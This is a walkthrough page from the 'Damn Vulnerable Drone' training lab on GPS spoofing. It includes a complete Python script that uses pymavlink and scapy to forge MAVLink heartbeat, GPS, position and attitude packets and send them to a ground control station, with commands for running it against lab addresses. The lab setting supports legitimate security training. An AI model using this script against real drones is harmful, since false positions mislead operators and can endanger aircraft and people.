<i>Spoofing the drone's GPS data to mislead the Ground Control Station (GCS) about the drone's actual location.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > GPS Spoofing

# Description

GPS spoofing involves sending false GPS data to the Ground Control Station (GCS) to mislead it about the drone's actual location. This can cause the operator to make incorrect decisions based on the spoofed data.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<p>Install required Python libraries:</p>

<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Create a file called <code>gps-spoofing.py</code> and paste the following:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_gps_raw_int():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=3,
        lat=473566100,
        lon=854619300,
        alt=1500,
        eph=100,
        epv=100,
        vel=500,
        cog=0,
        satellites_visible=10
    ).pack(mav)

def create_global_position_int():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.global_position_int_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        lat=473566100,
        lon=854619300,
        alt=1500000,
        relative_alt=1500000,
        vx=0,
        vy=0,
        vz=0,
        hdg=0
    ).pack(mav)

def create_attitude():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.attitude_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        roll=0.1,
        pitch=0.1,
        yaw=1.0,
        rollspeed=0.01,
        pitchspeed=0.01,
        yawspeed=0.1
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python gps-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_gps_raw_int(), target_ip, target_port)
        send_mavlink_packet(create_global_position_int(), target_ip, target_port)
        send_mavlink_packet(create_attitude(), target_ip, target_port)
        print(f"Sent spoofed MAVLink data to {target_ip}:{target_port}")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<p>Run the script using:</p>

<pre><code class="code mb-3 mt-3">sudo python3 gps-spoofing.py 10.13.0.6:14550</code></pre>

<p>Replace the IP and port as needed:</p>
<ul>
  <li><code>10.13.0.6:14550</code> – QGroundControl (Bridge)</li>
  <li><code>192.168.13.14:14550</code> – MAVProxy (WiFi)</li>
  <li><code>10.13.0.4:14550</code> – MAVProxy (Bridge)</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Open your Ground Control Station and observe the drone's GPS position. It should now reflect the spoofed coordinates instead of the real location.</p>

</details>
